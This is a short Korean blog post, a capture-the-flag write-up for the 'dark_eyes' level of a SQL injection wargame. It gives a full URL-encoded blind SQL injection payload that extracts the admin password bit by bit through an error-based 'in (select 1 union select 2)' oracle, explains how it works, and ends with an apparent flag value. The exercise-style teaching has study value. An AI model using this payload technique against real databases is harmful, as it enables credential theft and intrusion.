---
layout: post
title: LOS DARKEYES 
date: 2015-10-24 23:17:00 +0900
category: Hacking
---
```
http://los.sandbox.cash/chall/dark_eyes_54dda5c7a8bff987a29bd6fc9b2aa729.php?pw=%27or%20id=%27admin%27%20and%20substr(lpad(bin(ord(substr(pw,1,1))),8,%270%27),1,1)%20in%20(0,(select%201%20union%20select%202))%23
```



if와 case가 막혀있으므로 in 을 사용한다. 이것도 처음에 풀땐 함수찾는라 꽤 헤맸다.

왠 러시아 형님 블로그에 들어갔다.



쿼리를 해석해 보면 id가 admin이면서 pw의 값을 이진값으로 가져와서 그 값이 0인지 1인지 in 함수 안에서 비교한후 

0 in (0,(select 1 union select 2))%23이렇게 되면 select 1 union select 2를 실행을 안하지만

1 in (0,(select 1 union select 2))%23이렇게 되면 select 1 union select 2를 실행해서 에러가 난다. 이걸로 비교를 하는것이다. 



5b2a5e3d



